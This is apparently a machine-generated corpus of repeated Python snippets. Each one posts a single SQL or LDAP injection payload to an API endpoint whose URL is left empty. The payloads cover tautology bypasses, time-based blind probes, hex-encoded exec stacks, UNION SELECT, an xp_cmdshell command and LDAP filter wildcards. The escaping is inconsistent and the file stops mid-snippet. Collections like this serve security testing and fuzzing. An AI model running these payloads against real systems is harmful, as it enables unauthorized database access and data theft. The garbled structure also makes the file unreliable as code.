'def main\x28\x29:\n                    url = \\x22\\x22\n                    headers = {\\x22Content-Type\\x22: \\x22application/json\\x22, \\x22Authorization\\x22: \\x22Bearer TOKEN\\x22}\n                    data = {\\x22query\\x22: \\x22%27%20or%201=1\\x22}\n                    try:\n                        response = requests.post\x28url, headers=headers, json=data\x29\n                        response.raise_for_status\x28\x29\n                        print\x28response.status_code, end=\\x22\n\\x22\x29\n                        print\x28response.json\x28\x29\x29\n                    except requests.exceptions.RequestException as e:\n                        print\x28e\x29'
'def main\x28\x29:\n                    url = \\x22\\x22\n                    headers = {\\x22Content-Type\\x22: \\x22application/json\\x22, \\x22Authorization\\x22: \\x22Bearer TOKEN\\x22}\n                    data = {\\x22query\\x22: \\x22\x29\x29 or pg_sleep\x28__TIME__\x29--\\x22}\n                    try:\n                        response = requests.post\x28url, headers=headers, json=data\x29\n                        response.raise_for_status\x28\x29\n                        print\x28response.status_code, end=\\x22\n\\x22\x29\n                        print\x28response.json\x28\x29\x29\n                    except requests.exceptions.RequestException as e:\n                        print\x28e\x29'
'def main\x28\x29:\n                    url = \\x22\\x22\n                    headers = {\\x22Content-Type\\x22: \\x22application/json\\x22, \\x22Authorization\\x22: \\x22Bearer TOKEN\\x22}\n                    data = {\\x22query\\x22: \\x22%7C\\x22}\n                    try:\n                        response = requests.post\x28url, headers=headers, json=data\x29\n                        response.raise_for_status\x28\x29\n                        print\x28response.status_code, end=\\x22\n\\x22\x29\n                        print\x28response.json\x28\x29\x29\n                    except requests.exceptions.RequestException as e:\n                        print\x28e\x29'
def main():
                    url = \x22\x22
                    headers = {\x22Content-Type\x22: \x22application/json\x22, \x22Authorization\x22: \x22Bearer TOKEN\x22}
                    data = {\x22query\x22: \x22x' AND 1=(SELECT COUNT(*) FROM tabname); --\x22}
                    try:
                        response = requests.post(url, headers=headers, json=data)
                        response.raise_for_status()
                        print(response.status_code, end=\x22
\x22)
                        print(response.json())
                    except requests.exceptions.RequestException as e:
                        print(e)
'def main\x28\x29:\n                    url = \\x22\\x22\n                    headers = {\\x22Content-Type\\x22: \\x22application/json\\x22, \\x22Authorization\\x22: \\x22Bearer TOKEN\\x22}\n                    data = {\\x22query\\x22: \\x22&apos;%20OR\\x22}\n                    try:\n                        response = requests.post\x28url, headers=headers, json=data\x29\n                        response.raise_for_status\x28\x29\n                        print\x28response.status_code, end=\\x22\n\\x22\x29\n                        print\x28response.json\x28\x29\x29\n                    except requests.exceptions.RequestException as e:\n                        print\x28e\x29'
def main():
                    url = \x22\x22
                    headers = {\x22Content-Type\x22: \x22application/json\x22, \x22Authorization\x22: \x22Bearer TOKEN\x22}
                    data = {\x22query\x22: \x22; or '1'='1'\x22}
                    try:
                        response = requests.post(url, headers=headers, json=data)
                        response.raise_for_status()
                        print(response.status_code, end=\x22
\x22)
                        print(response.json())
                    except requests.exceptions.RequestException as e:
                        print(e)
'def main\x28\x29:\n                    url = \\x22\\x22\n                    headers = {\\x22Content-Type\\x22: \\x22application/json\\x22, \\x22Authorization\\x22: \\x22Bearer TOKEN\\x22}\n                    data = {\\x22query\\x22: \\x22declare \x40q nvarchar \x28200\x29 select \x40q = 0x770061 ...\\x22}\n                    try:\n                        response = requests.post\x28url, headers=headers, json=data\x29\n                        response.raise_for_status\x28\x29\n                        print\x28response.status_code, end=\\x22\n\\x22\x29\n                        print\x28response.json\x28\x29\x29\n                    except requests.exceptions.RequestException as e:\n                        print\x28e\x29'
'def main\x28\x29:\n                    url = \\x22\\x22\n                    headers = {\\x22Content-Type\\x22: \\x22application/json\\x22, \\x22Authorization\\x22: \\x22Bearer TOKEN\\x22}\n                    data = {\\x22query\\x22: \\x221 or 1=1\\x22}\n                    try:\n                        response = requests.post\x28url, headers=headers, json=data\x29\n                        response.raise_for_status\x28\x29\n                        print\x28response.status_code, end=\\x22\n\\x22\x29\n                        print\x28response.json\x28\x29\x29\n                    except requests.exceptions.RequestException as e:\n                        print\x28e\x29'
def main():
                    url = \x22\x22
                    headers = {\x22Content-Type\x22: \x22application/json\x22, \x22Authorization\x22: \x22Bearer TOKEN\x22}
                    data = {\x22query\x22: \x22; exec ('sel' + 'ect us' + 'er')\x22}
                    try:
                        response = requests.post(url, headers=headers, json=data)
                        response.raise_for_status()
                        print(response.status_code, end=\x22
\x22)
                        print(response.json())
                    except requests.exceptions.RequestException as e:
                        print(e)
'def main\x28\x29:\n                    url = \\x22\\x22\n                    headers = {\\x22Content-Type\\x22: \\x22application/json\\x22, \\x22Authorization\\x22: \\x22Bearer TOKEN\\x22}\n                    data = {\\x22query\\x22: \\x2223 OR 1=1\\x22}\n                    try:\n                        response = requests.post\x28url, headers=headers, json=data\x29\n                        response.raise_for_status\x28\x29\n                        print\x28response.status_code, end=\\x22\n\\x22\x29\n                        print\x28response.json\x28\x29\x29\n                    except requests.exceptions.RequestException as e:\n                        print\x28e\x29'
'def main\x28\x29:\n                    url = \\x22\\x22\n                    headers = {\\x22Content-Type\\x22: \\x22application/json\\x22, \\x22Authorization\\x22: \\x22Bearer TOKEN\\x22}\n                    data = {\\x22query\\x22: \\x22/\\x22}\n                    try:\n                        response = requests.post\x28url, headers=headers, json=data\x29\n                        response.raise_for_status\x28\x29\n                        print\x28response.status_code, end=\\x22\n\\x22\x29\n                        print\x28response.json\x28\x29\x29\n                    except requests.exceptions.RequestException as e:\n                        print\x28e\x29'
def main():
                    url = \x22\x22
                    headers = {\x22Content-Type\x22: \x22application/json\x22, \x22Authorization\x22: \x22Bearer TOKEN\x22}
                    data = {\x22query\x22: \x22anything' OR 'x'='x\x22}
                    try:
                        response = requests.post(url, headers=headers, json=data)
                        response.raise_for_status()
                        print(response.status_code, end=\x22
\x22)
                        print(response.json())
                    except requests.exceptions.RequestException as e:
                        print(e)
'def main\x28\x29:\n                    url = \\x22\\x22\n                    headers = {\\x22Content-Type\\x22: \\x22application/json\\x22, \\x22Authorization\\x22: \\x22Bearer TOKEN\\x22}\n                    data = {\\x22query\\x22: \\x22declare \x40q nvarchar \x284000\x29 select \x40q =\\x22}\n                    try:\n                        response = requests.post\x28url, headers=headers, json=data\x29\n                        response.raise_for_status\x28\x29\n                        print\x28response.status_code, end=\\x22\n\\x22\x29\n                        print\x28response.json\x28\x29\x29\n                    except requests.exceptions.RequestException as e:\n                        print\x28e\x29'
'def main\x28\x29:\n                    url = \\x22\\x22\n                    headers = {\\x22Content-Type\\x22: \\x22application/json\\x22, \\x22Authorization\\x22: \\x22Bearer TOKEN\\x22}\n                    data = {\\x22query\\x22: \\x22or 0=0 --\\x22}\n                    try:\n                        response = requests.post\x28url, headers=headers, json=data\x29\n                        response.raise_for_status\x28\x29\n                        print\x28response.status_code, end=\\x22\n\\x22\x29\n                        print\x28response.json\x28\x29\x29\n                    except requests.exceptions.RequestException as e:\n                        print\x28e\x29'
'def main\x28\x29:\n                    url = \\x22\\x22\n                    headers = {\\x22Content-Type\\x22: \\x22application/json\\x22, \\x22Authorization\\x22: \\x22Bearer TOKEN\\x22}\n                    data = {\\x22query\\x22: \\x22desc\\x22}\n                    try:\n                        response = requests.post\x28url, headers=headers, json=data\x29\n                        response.raise_for_status\x28\x29\n                        print\x28response.status_code, end=\\x22\n\\x22\x29\n                        print\x28response.json\x28\x29\x29\n                    except requests.exceptions.RequestException as e:\n                        print\x28e\x29'
def main():
                    url = \x22\x22
                    headers = {\x22Content-Type\x22: \x22application/json\x22, \x22Authorization\x22: \x22Bearer TOKEN\x22}
                    data = {\x22query\x22: \x22||'6\x22}
                    try:
                        response = requests.post(url, headers=headers, json=data)
                        response.raise_for_status()
                        print(response.status_code, end=\x22
\x22)
                        print(response.json())
                    except requests.exceptions.RequestException as e:
                        print(e)
'def main\x28\x29:\n                    url = \\x22\\x22\n                    headers = {\\x22Content-Type\\x22: \\x22application/json\\x22, \\x22Authorization\\x22: \\x22Bearer TOKEN\\x22}\n                    data = {\\x22query\\x22: \\x22\x29\\x22}\n                    try:\n                        response = requests.post\x28url, headers=headers, json=data\x29\n                        response.raise_for_status\x28\x29\n                        print\x28response.status_code, end=\\x22\n\\x22\x29\n                        print\x28response.json\x28\x29\x29\n                    except requests.exceptions.RequestException as e:\n                        print\x28e\x29'
'def main\x28\x29:\n                    url = \\x22\\x22\n                    headers = {\\x22Content-Type\\x22: \\x22application/json\\x22, \\x22Authorization\\x22: \\x22Bearer TOKEN\\x22}\n                    data = {\\x22query\\x22: \\x221\x29\x29 or sleep\x28__TIME__\x29#\\x22}\n                    try:\n                        response = requests.post\x28url, headers=headers, json=data\x29\n                        response.raise_for_status\x28\x29\n                        print\x28response.status_code, end=\\x22\n\\x22\x29\n                        print\x28response.json\x28\x29\x29\n                    except requests.exceptions.RequestException as e:\n                        print\x28e\x29'
'def main\x28\x29:\n                    url = \\x22\\x22\n                    headers = {\\x22Content-Type\\x22: \\x22application/json\\x22, \\x22Authorization\\x22: \\x22Bearer TOKEN\\x22}\n                    data = {\\x22query\\x22: \\x22or 0=0 #\\x22}\n                    try:\n                        response = requests.post\x28url, headers=headers, json=data\x29\n                        response.raise_for_status\x28\x29\n                        print\x28response.status_code, end=\\x22\n\\x22\x29\n                        print\x28response.json\x28\x29\x29\n                    except requests.exceptions.RequestException as e:\n                        print\x28e\x29'
'def main\x28\x29:\n                    url = \\x22\\x22\n                    headers = {\\x22Content-Type\\x22: \\x22application/json\\x22, \\x22Authorization\\x22: \\x22Bearer TOKEN\\x22}\n                    data = {\\x22query\\x22: \\x22select name from syscolumns where id = \x28sele ...\\x22}\n                    try:\n                        response = requests.post\x28url, headers=headers, json=data\x29\n                        response.raise_for_status\x28\x29\n                        print\x28response.status_code, end=\\x22\n\\x22\x29\n                        print\x28response.json\x28\x29\x29\n                    except requests.exceptions.RequestException as e:\n                        print\x28e\x29'
'def main\x28\x29:\n                    url = \\x22\\x22\n                    headers = {\\x22Content-Type\\x22: \\x22application/json\\x22, \\x22Authorization\\x22: \\x22Bearer TOKEN\\x22}\n                    data = {\\x22query\\x22: \\x22hi or a=a\\x22}\n                    try:\n                        response = requests.post\x28url, headers=headers, json=data\x29\n                        response.raise_for_status\x28\x29\n                        print\x28response.status_code, end=\\x22\n\\x22\x29\n                        print\x28response.json\x28\x29\x29\n                    except requests.exceptions.RequestException as e:\n                        print\x28e\x29'
'def main\x28\x29:\n                    url = \\x22\\x22\n                    headers = {\\x22Content-Type\\x22: \\x22application/json\\x22, \\x22Authorization\\x22: \\x22Bearer TOKEN\\x22}\n                    data = {\\x22query\\x22: \\x22*\x28|\x28mail=*\x29\x29\\x22}\n                    try:\n                        response = requests.post\x28url, headers=headers, json=data\x29\n                        response.raise_for_status\x28\x29\n                        print\x28response.status_code, end=\\x22\n\\x22\x29\n                        print\x28response.json\x28\x29\x29\n                    except requests.exceptions.RequestException as e:\n                        print\x28e\x29'
'def main\x28\x29:\n                    url = \\x22\\x22\n                    headers = {\\x22Content-Type\\x22: \\x22application/json\\x22, \\x22Authorization\\x22: \\x22Bearer TOKEN\\x22}\n                    data = {\\x22query\\x22: \\x22password:*/=1--\\x22}\n                    try:\n                        response = requests.post\x28url, headers=headers, json=data\x29\n                        response.raise_for_status\x28\x29\n                        print\x28response.status_code, end=\\x22\n\\x22\x29\n                        print\x28response.json\x28\x29\x29\n                    except requests.exceptions.RequestException as e:\n                        print\x28e\x29'
'def main\x28\x29:\n                    url = \\x22\\x22\n                    headers = {\\x22Content-Type\\x22: \\x22application/json\\x22, \\x22Authorization\\x22: \\x22Bearer TOKEN\\x22}\n                    data = {\\x22query\\x22: \\x22distinct\\x22}\n                    try:\n                        response = requests.post\x28url, headers=headers, json=data\x29\n                        response.raise_for_status\x28\x29\n                        print\x28response.status_code, end=\\x22\n\\x22\x29\n                        print\x28response.json\x28\x29\x29\n                    except requests.exceptions.RequestException as e:\n                        print\x28e\x29'
def main():
                    url = \x22\x22
                    headers = {\x22Content-Type\x22: \x22application/json\x22, \x22Authorization\x22: \x22Bearer TOKEN\x22}
                    data = {\x22query\x22: \x22);waitfor delay '0:0:__TIME__'--\x22}
                    try:
                        response = requests.post(url, headers=headers, json=data)
                        response.raise_for_status()
                        print(response.status_code, end=\x22
\x22)
                        print(response.json())
                    except requests.exceptions.RequestException as e:
                        print(e)
'def main\x28\x29:\n                    url = \\x22\\x22\n                    headers = {\\x22Content-Type\\x22: \\x22application/json\\x22, \\x22Authorization\\x22: \\x22Bearer TOKEN\\x22}\n                    data = {\\x22query\\x22: \\x22to_timestamp_tz\\x22}\n                    try:\n                        response = requests.post\x28url, headers=headers, json=data\x29\n                        response.raise_for_status\x28\x29\n                        print\x28response.status_code, end=\\x22\n\\x22\x29\n                        print\x28response.json\x28\x29\x29\n                    except requests.exceptions.RequestException as e:\n                        print\x28e\x29'
'def main\x28\x29:\n                    url = \\x22\\x22\n                    headers = {\\x22Content-Type\\x22: \\x22application/json\\x22, \\x22Authorization\\x22: \\x22Bearer TOKEN\\x22}\n                    data = {\\x22query\\x22: \\x22\\x22\x29 or benchmark\x2810000000,MD5\x281\x29\x29#\\x22}\n                    try:\n                        response = requests.post\x28url, headers=headers, json=data\x29\n                        response.raise_for_status\x28\x29\n                        print\x28response.status_code, end=\\x22\n\\x22\x29\n                        print\x28response.json\x28\x29\x29\n                    except requests.exceptions.RequestException as e:\n                        print\x28e\x29'
'def main\x28\x29:\n                    url = \\x22\\x22\n                    headers = {\\x22Content-Type\\x22: \\x22application/json\\x22, \\x22Authorization\\x22: \\x22Bearer TOKEN\\x22}\n                    data = {\\x22query\\x22: \\x22UNION SELECT\\x22}\n                    try:\n                        response = requests.post\x28url, headers=headers, json=data\x29\n                        response.raise_for_status\x28\x29\n                        print\x28response.status_code, end=\\x22\n\\x22\x29\n                        print\x28response.json\x28\x29\x29\n                    except requests.exceptions.RequestException as e:\n                        print\x28e\x29'
'def main\x28\x29:\n                    url = \\x22\\x22\n                    headers = {\\x22Content-Type\\x22: \\x22application/json\\x22, \\x22Authorization\\x22: \\x22Bearer TOKEN\\x22}\n                    data = {\\x22query\\x22: \\x22%2A%28%7C%28mail%3D%2A%29%29\\x22}\n                    try:\n                        response = requests.post\x28url, headers=headers, json=data\x29\n                        response.raise_for_status\x28\x29\n                        print\x28response.status_code, end=\\x22\n\\x22\x29\n                        print\x28response.json\x28\x29\x29\n                    except requests.exceptions.RequestException as e:\n                        print\x28e\x29'
'def main\x28\x29:\n                    url = \\x22\\x22\n                    headers = {\\x22Content-Type\\x22: \\x22application/json\\x22, \\x22Authorization\\x22: \\x22Bearer TOKEN\\x22}\n                    data = {\\x22query\\x22: \\x22+sqlvuln\\x22}\n                    try:\n                        response = requests.post\x28url, headers=headers, json=data\x29\n                        response.raise_for_status\x28\x29\n                        print\x28response.status_code, end=\\x22\n\\x22\x29\n                        print\x28response.json\x28\x29\x29\n                    except requests.exceptions.RequestException as e:\n                        print\x28e\x29'
'def main\x28\x29:\n                    url = \\x22\\x22\n                    headers = {\\x22Content-Type\\x22: \\x22application/json\\x22, \\x22Authorization\\x22: \\x22Bearer TOKEN\\x22}\n                    data = {\\x22query\\x22: \\x22or 1=1 /*\\x22}\n                    try:\n                        response = requests.post\x28url, headers=headers, json=data\x29\n                        response.raise_for_status\x28\x29\n                        print\x28response.status_code, end=\\x22\n\\x22\x29\n                        print\x28response.json\x28\x29\x29\n                    except requests.exceptions.RequestException as e:\n                        print\x28e\x29'
def main():
                    url = \x22\x22
                    headers = {\x22Content-Type\x22: \x22application/json\x22, \x22Authorization\x22: \x22Bearer TOKEN\x22}
                    data = {\x22query\x22: \x22)) or sleep(__TIME__)='\x22}
                    try:
                        response = requests.post(url, headers=headers, json=data)
                        response.raise_for_status()
                        print(response.status_code, end=\x22
\x22)
                        print(response.json())
                    except requests.exceptions.RequestException as e:
                        print(e)
'def main\x28\x29:\n                    url = \\x22\\x22\n                    headers = {\\x22Content-Type\\x22: \\x22application/json\\x22, \\x22Authorization\\x22: \\x22Bearer TOKEN\\x22}\n                    data = {\\x22query\\x22: \\x22or 1=1 or \\x22\\x22=\\x22}\n                    try:\n                        response = requests.post\x28url, headers=headers, json=data\x29\n                        response.raise_for_status\x28\x29\n                        print\x28response.status_code, end=\\x22\n\\x22\x29\n                        print\x28response.json\x28\x29\x29\n                    except requests.exceptions.RequestException as e:\n                        print\x28e\x29'
'def main\x28\x29:\n                    url = \\x22\\x22\n                    headers = {\\x22Content-Type\\x22: \\x22application/json\\x22, \\x22Authorization\\x22: \\x22Bearer TOKEN\\x22}\n                    data = {\\x22query\\x22: \\x22or 1 in \x28select \x40\x40version\x29--\\x22}\n                    try:\n                        response = requests.post\x28url, headers=headers, json=data\x29\n                        response.raise_for_status\x28\x29\n                        print\x28response.status_code, end=\\x22\n\\x22\x29\n                        print\x28response.json\x28\x29\x29\n                    except requests.exceptions.RequestException as e:\n                        print\x28e\x29'
'def main\x28\x29:\n                    url = \\x22\\x22\n                    headers = {\\x22Content-Type\\x22: \\x22application/json\\x22, \\x22Authorization\\x22: \\x22Bearer TOKEN\\x22}\n                    data = {\\x22query\\x22: \\x22sqlvuln;\\x22}\n                    try:\n                        response = requests.post\x28url, headers=headers, json=data\x29\n                        response.raise_for_status\x28\x29\n                        print\x28response.status_code, end=\\x22\n\\x22\x29\n                        print\x28response.json\x28\x29\x29\n                    except requests.exceptions.RequestException as e:\n                        print\x28e\x29'
'def main\x28\x29:\n                    url = \\x22\\x22\n                    headers = {\\x22Content-Type\\x22: \\x22application/json\\x22, \\x22Authorization\\x22: \\x22Bearer TOKEN\\x22}\n                    data = {\\x22query\\x22: \\x22union select * from users where login = char ...\\x22}\n                    try:\n                        response = requests.post\x28url, headers=headers, json=data\x29\n                        response.raise_for_status\x28\x29\n                        print\x28response.status_code, end=\\x22\n\\x22\x29\n                        print\x28response.json\x28\x29\x29\n                    except requests.exceptions.RequestException as e:\n                        print\x28e\x29'
def main():
                    url = \x22\x22
                    headers = {\x22Content-Type\x22: \x22application/json\x22, \x22Authorization\x22: \x22Bearer TOKEN\x22}
                    data = {\x22query\x22: \x22x' or 1=1 or 'x'='y\x22}
                    try:
                        response = requests.post(url, headers=headers, json=data)
                        response.raise_for_status()
                        print(response.status_code, end=\x22
\x22)
                        print(response.json())
                    except requests.exceptions.RequestException as e:
                        print(e)
'def main\x28\x29:\n                    url = \\x22\\x22\n                    headers = {\\x22Content-Type\\x22: \\x22application/json\\x22, \\x22Authorization\\x22: \\x22Bearer TOKEN\\x22}\n                    data = {\\x22query\\x22: \\x2228 %\\x22}\n                    try:\n                        response = requests.post\x28url, headers=headers, json=data\x29\n                        response.raise_for_status\x28\x29\n                        print\x28response.status_code, end=\\x22\n\\x22\x29\n                        print\x28response.json\x28\x29\x29\n                    except requests.exceptions.RequestException as e:\n                        print\x28e\x29'
'def main\x28\x29:\n                    url = \\x22\\x22\n                    headers = {\\x22Content-Type\\x22: \\x22application/json\\x22, \\x22Authorization\\x22: \\x22Bearer TOKEN\\x22}\n                    data = {\\x22query\\x22: \\x22â\x80\x98 or 3=3 --\\x22}\n                    try:\n                        response = requests.post\x28url, headers=headers, json=data\x29\n                        response.raise_for_status\x28\x29\n                        print\x28response.status_code, end=\\x22\n\\x22\x29\n                        print\x28response.json\x28\x29\x29\n                    except requests.exceptions.RequestException as e:\n                        print\x28e\x29'
'def main\x28\x29:\n                    url = \\x22\\x22\n                    headers = {\\x22Content-Type\\x22: \\x22application/json\\x22, \\x22Authorization\\x22: \\x22Bearer TOKEN\\x22}\n                    data = {\\x22query\\x22: \\x22\x40variable\\x22}\n                    try:\n                        response = requests.post\x28url, headers=headers, json=data\x29\n                        response.raise_for_status\x28\x29\n                        print\x28response.status_code, end=\\x22\n\\x22\x29\n                        print\x28response.json\x28\x29\x29\n                    except requests.exceptions.RequestException as e:\n                        print\x28e\x29'
def main():
                    url = \x22\x22
                    headers = {\x22Content-Type\x22: \x22application/json\x22, \x22Authorization\x22: \x22Bearer TOKEN\x22}
                    data = {\x22query\x22: \x22or '1'='1'--\x22}
                    try:
                        response = requests.post(url, headers=headers, json=data)
                        response.raise_for_status()
                        print(response.status_code, end=\x22
\x22)
                        print(response.json())
                    except requests.exceptions.RequestException as e:
                        print(e)
'def main\x28\x29:\n                    url = \\x22\\x22\n                    headers = {\\x22Content-Type\\x22: \\x22application/json\\x22, \\x22Authorization\\x22: \\x22Bearer TOKEN\\x22}\n                    data = {\\x22query\\x22: \\x22\\x22a\\x22\\x22 or 1=1--\\x22\\x22}\n                    try:\n                        response = requests.post\x28url, headers=headers, json=data\x29\n                        response.raise_for_status\x28\x29\n                        print\x28response.status_code, end=\\x22\n\\x22\x29\n                        print\x28response.json\x28\x29\x29\n                    except requests.exceptions.RequestException as e:\n                        print\x28e\x29'
'def main\x28\x29:\n                    url = \\x22\\x22\n                    headers = {\\x22Content-Type\\x22: \\x22application/json\\x22, \\x22Authorization\\x22: \\x22Bearer TOKEN\\x22}\n                    data = {\\x22query\\x22: \\x22//*\\x22}\n                    try:\n                        response = requests.post\x28url, headers=headers, json=data\x29\n                        response.raise_for_status\x28\x29\n                        print\x28response.status_code, end=\\x22\n\\x22\x29\n                        print\x28response.json\x28\x29\x29\n                    except requests.exceptions.RequestException as e:\n                        print\x28e\x29'
'def main\x28\x29:\n                    url = \\x22\\x22\n                    headers = {\\x22Content-Type\\x22: \\x22application/json\\x22, \\x22Authorization\\x22: \\x22Bearer TOKEN\\x22}\n                    data = {\\x22query\\x22: \\x22%2A%7C\\x22}\n                    try:\n                        response = requests.post\x28url, headers=headers, json=data\x29\n                        response.raise_for_status\x28\x29\n                        print\x28response.status_code, end=\\x22\n\\x22\x29\n                        print\x28response.json\x28\x29\x29\n                    except requests.exceptions.RequestException as e:\n                        print\x28e\x29'
'def main\x28\x29:\n                    url = \\x22\\x22\n                    headers = {\\x22Content-Type\\x22: \\x22application/json\\x22, \\x22Authorization\\x22: \\x22Bearer TOKEN\\x22}\n                    data = {\\x22query\\x22: \\x22\\x22 or 0=0 --\\x22}\n                    try:\n                        response = requests.post\x28url, headers=headers, json=data\x29\n                        response.raise_for_status\x28\x29\n                        print\x28response.status_code, end=\\x22\n\\x22\x29\n                        print\x28response.json\x28\x29\x29\n                    except requests.exceptions.RequestException as e:\n                        print\x28e\x29'
'def main\x28\x29:\n                    url = \\x22\\x22\n                    headers = {\\x22Content-Type\\x22: \\x22application/json\\x22, \\x22Authorization\\x22: \\x22Bearer TOKEN\\x22}\n                    data = {\\x22query\\x22: \\x22\\x22\x29\x29 or pg_sleep\x28__TIME__\x29--\\x22}\n                    try:\n                        response = requests.post\x28url, headers=headers, json=data\x29\n                        response.raise_for_status\x28\x29\n                        print\x28response.status_code, end=\\x22\n\\x22\x29\n                        print\x28response.json\x28\x29\x29\n                    except requests.exceptions.RequestException as e:\n                        print\x28e\x29'
'def main\x28\x29:\n                    url = \\x22\\x22\n                    headers = {\\x22Content-Type\\x22: \\x22application/json\\x22, \\x22Authorization\\x22: \\x22Bearer TOKEN\\x22}\n                    data = {\\x22query\\x22: \\x22?\\x22}\n                    try:\n                        response = requests.post\x28url, headers=headers, json=data\x29\n                        response.raise_for_status\x28\x29\n                        print\x28response.status_code, end=\\x22\n\\x22\x29\n                        print\x28response.json\x28\x29\x29\n                    except requests.exceptions.RequestException as e:\n                        print\x28e\x29'
'def main\x28\x29:\n                    url = \\x22\\x22\n                    headers = {\\x22Content-Type\\x22: \\x22application/json\\x22, \\x22Authorization\\x22: \\x22Bearer TOKEN\\x22}\n                    data = {\\x22query\\x22: \\x22or 1/*\\x22}\n                    try:\n                        response = requests.post\x28url, headers=headers, json=data\x29\n                        response.raise_for_status\x28\x29\n                        print\x28response.status_code, end=\\x22\n\\x22\x29\n                        print\x28response.json\x28\x29\x29\n                    except requests.exceptions.RequestException as e:\n                        print\x28e\x29'
'def main\x28\x29:\n                    url = \\x22\\x22\n                    headers = {\\x22Content-Type\\x22: \\x22application/json\\x22, \\x22Authorization\\x22: \\x22Bearer TOKEN\\x22}\n                    data = {\\x22query\\x22: \\x22\x21\\x22}\n                    try:\n                        response = requests.post\x28url, headers=headers, json=data\x29\n                        response.raise_for_status\x28\x29\n                        print\x28response.status_code, end=\\x22\n\\x22\x29\n                        print\x28response.json\x28\x29\x29\n                    except requests.exceptions.RequestException as e:\n                        print\x28e\x29'
def main():
                    url = \x22\x22
                    headers = {\x22Content-Type\x22: \x22application/json\x22, \x22Authorization\x22: \x22Bearer TOKEN\x22}
                    data = {\x22query\x22: \x22'\x22}
                    try:
                        response = requests.post(url, headers=headers, json=data)
                        response.raise_for_status()
                        print(response.status_code, end=\x22
\x22)
                        print(response.json())
                    except requests.exceptions.RequestException as e:
                        print(e)
'def main\x28\x29:\n                    url = \\x22\\x22\n                    headers = {\\x22Content-Type\\x22: \\x22application/json\\x22, \\x22Authorization\\x22: \\x22Bearer TOKEN\\x22}\n                    data = {\\x22query\\x22: \\x22or a = a\\x22}\n                    try:\n                        response = requests.post\x28url, headers=headers, json=data\x29\n                        response.raise_for_status\x28\x29\n                        print\x28response.status_code, end=\\x22\n\\x22\x29\n                        print\x28response.json\x28\x29\x29\n                    except requests.exceptions.RequestException as e:\n                        print\x28e\x29'
'def main\x28\x29:\n                    url = \\x22\\x22\n                    headers = {\\x22Content-Type\\x22: \\x22application/json\\x22, \\x22Authorization\\x22: \\x22Bearer TOKEN\\x22}\n                    data = {\\x22query\\x22: \\x22declare \x40q nvarchar \x28200\x29 select \x40q = 0x770061006900740066006F0072002000640065006C00610079002000270030003A0030003A0031003000270000 exec\x28\x40q\x29\\x22}\n                    try:\n                        response = requests.post\x28url, headers=headers, json=data\x29\n                        response.raise_for_status\x28\x29\n                        print\x28response.status_code, end=\\x22\n\\x22\x29\n                        print\x28response.json\x28\x29\x29\n                    except requests.exceptions.RequestException as e:\n                        print\x28e\x29'
'def main\x28\x29:\n                    url = \\x22\\x22\n                    headers = {\\x22Content-Type\\x22: \\x22application/json\\x22, \\x22Authorization\\x22: \\x22Bearer TOKEN\\x22}\n                    data = {\\x22query\\x22: \\x22declare \x40s varchar\x28200\x29 select \x40s = 0x77616974666F722064656C61792027303A303A31302700 exec\x28\x40s\x29\\x22}\n                    try:\n                        response = requests.post\x28url, headers=headers, json=data\x29\n                        response.raise_for_status\x28\x29\n                        print\x28response.status_code, end=\\x22\n\\x22\x29\n                        print\x28response.json\x28\x29\x29\n                    except requests.exceptions.RequestException as e:\n                        print\x28e\x29'
'def main\x28\x29:\n                    url = \\x22\\x22\n                    headers = {\\x22Content-Type\\x22: \\x22application/json\\x22, \\x22Authorization\\x22: \\x22Bearer TOKEN\\x22}\n                    data = {\\x22query\\x22: \\x22declare \x40q nvarchar \x28200\x29 0x730065006c00650063007400200040004000760065007200730069006f006e00 exec\x28\x40q\x29\\x22}\n                    try:\n                        response = requests.post\x28url, headers=headers, json=data\x29\n                        response.raise_for_status\x28\x29\n                        print\x28response.status_code, end=\\x22\n\\x22\x29\n                        print\x28response.json\x28\x29\x29\n                    except requests.exceptions.RequestException as e:\n                        print\x28e\x29'
'def main\x28\x29:\n                    url = \\x22\\x22\n                    headers = {\\x22Content-Type\\x22: \\x22application/json\\x22, \\x22Authorization\\x22: \\x22Bearer TOKEN\\x22}\n                    data = {\\x22query\\x22: \\x22declare \x40s varchar \x28200\x29 select \x40s = 0x73656c65637420404076657273696f6e exec\x28\x40s\x29\\x22}\n                    try:\n                        response = requests.post\x28url, headers=headers, json=data\x29\n                        response.raise_for_status\x28\x29\n                        print\x28response.status_code, end=\\x22\n\\x22\x29\n                        print\x28response.json\x28\x29\x29\n                    except requests.exceptions.RequestException as e:\n                        print\x28e\x29'
def main():
                    url = \x22\x22
                    headers = {\x22Content-Type\x22: \x22application/json\x22, \x22Authorization\x22: \x22Bearer TOKEN\x22}
                    data = {\x22query\x22: \x22' or 1=1\x22}
                    try:
                        response = requests.post(url, headers=headers, json=data)
                        response.raise_for_status()
                        print(response.status_code, end=\x22
\x22)
                        print(response.json())
                    except requests.exceptions.RequestException as e:
                        print(e)
'def main\x28\x29:\n                    url = \\x22\\x22\n                    headers = {\\x22Content-Type\\x22: \\x22application/json\\x22, \\x22Authorization\\x22: \\x22Bearer TOKEN\\x22}\n                    data = {\\x22query\\x22: \\x22\x18 or 1=1 --\\x22}\n                    try:\n                        response = requests.post\x28url, headers=headers, json=data\x29\n                        response.raise_for_status\x28\x29\n                        print\x28response.status_code, end=\\x22\n\\x22\x29\n                        print\x28response.json\x28\x29\x29\n                    except requests.exceptions.RequestException as e:\n                        print\x28e\x29'
def main():
                    url = \x22\x22
                    headers = {\x22Content-Type\x22: \x22application/json\x22, \x22Authorization\x22: \x22Bearer TOKEN\x22}
                    data = {\x22query\x22: \x22x' OR full_name LIKE '%Bob%\x22}
                    try:
                        response = requests.post(url, headers=headers, json=data)
                        response.raise_for_status()
                        print(response.status_code, end=\x22
\x22)
                        print(response.json())
                    except requests.exceptions.RequestException as e:
                        print(e)
def main():
                    url = \x22\x22
                    headers = {\x22Content-Type\x22: \x22application/json\x22, \x22Authorization\x22: \x22Bearer TOKEN\x22}
                    data = {\x22query\x22: \x22'; exec master..xp_cmdshell 'ping 172.10.1.255'--\x22}
                    try:
                        response = requests.post(url, headers=headers, json=data)
                        response.raise_for_status()
                        print(response.status_code, end=\x22
\x22)
                        print(response.json())
                    except requests.exceptions.RequestException as e:
                        print(e)
def main():
                    url = \x22\x22
                    headers = {\x22Content-Type\x22: \x22application/json\x22, \x22Authorization\x22: \x22Bearer TOKEN\x22}
                    data = {\x22query\x22: \x22'%20or%20''='\x22}
                    try:
                        response = requests.post(url, headers=headers, json=data)
                        response.raise_for_status()
                        print(response.status_code, end=\x22
\x22)
                        print(response.json())
                    except requests.exceptions.RequestException as e:
                        print(e)
def main():
                    url = \x22\x22
